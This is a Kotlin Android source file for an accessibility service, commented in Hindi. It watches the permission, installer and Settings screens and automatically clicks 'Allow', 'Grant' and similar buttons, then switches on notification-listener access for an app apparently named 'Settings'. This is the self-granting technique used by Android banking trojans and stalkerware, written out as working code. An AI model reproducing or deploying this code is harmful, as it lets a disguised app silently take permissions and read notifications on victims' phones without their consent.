package com.security.testapp

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoPermissionService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var isProcessing = false
    private var lastActionTime = 0L

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 200
            // सभी Permission और Settings से जुड़े पैकेज
            packageNames = arrayOf(
                "com.android.permissioncontroller",
                "com.google.android.permissioncontroller",
                "com.android.packageinstaller",
                "com.android.settings",
                "com.coloros.permissioncontroller",
                "com.oppo.permissioncontroller",
                "com.oneplus.permissioncontroller"
            )
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || isProcessing) return

        val now = System.currentTimeMillis()
        if (now - lastActionTime < 800) return   // बार-बार क्लिक रोकें

        isProcessing = true
        lastActionTime = now

        // 600ms बाद प्रोसेस करें ताकि विंडो पूरी लोड हो जाए
        handler.postDelayed({ processCurrentScreen() }, 600)
    }

    private fun processCurrentScreen() {
        val root = rootInActiveWindow
        if (root == null) {
            isProcessing = false
            return
        }

        // 1. सबसे पहले "Allow" / "Allow anyway" / "अनुमति दें" जैसे बटन खोजें
        val allowTexts = arrayOf(
            "Allow", "ALLOW", "Allow anyway",
            "अनुमति दें", "अनुमति दीजिए", "इजाज़त दें",
            "OK", "Grant", "Yes", "हाँ", "ठीक है"
        )
        if (clickAny(root, *allowTexts)) {
            isProcessing = false
            return
        }

        // 2. फिर "Not allowed" / "अनुमति नहीं है" खोजें और क्लिक करें
        val notAllowedTexts = arrayOf(
            "Not allowed", "अनुमति नहीं है", "अनुमति नहीं", "अनुमति नहीं दी",
            "Not Allowed", "अनुमति नहीं दी गई"
        )
        if (clickAny(root, *notAllowedTexts)) {
            isProcessing = false
            return
        }

        // 3. अगर Notification Listener सेटिंग खुली है तो स्विच ऑन करें
        enableNotificationListenerSwitch(root)

        isProcessing = false
    }

    /** दिए गए टेक्स्ट में से पहला क्लिक करने योग्य नोड ढूँढ़कर क्लिक करें */
    private fun clickAny(root: AccessibilityNodeInfo, vararg texts: String): Boolean {
        for (text in texts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes != null) {
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return true
                    }
                }
            }
        }
        return false
    }

    private fun enableNotificationListenerSwitch(root: AccessibilityNodeInfo) {
        val appName = getString(R.string.app_name) // "Settings"
        val listItems = root.findAccessibilityNodeInfosByText(appName)
        if (listItems != null) {
            for (item in listItems) {
                var parent = item.parent
                while (parent != null) {
                    for (i in 0 until parent.childCount) {
                        val child = parent.getChild(i)
                        if (child != null &&
                            "android.widget.Switch" == child.className &&
                            !child.isChecked
                        ) {
                            child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            return
                        }
                    }
                    parent = parent.parent
                }
            }
        }
    }

    override fun onInterrupt() {
        isProcessing = false
    }
}
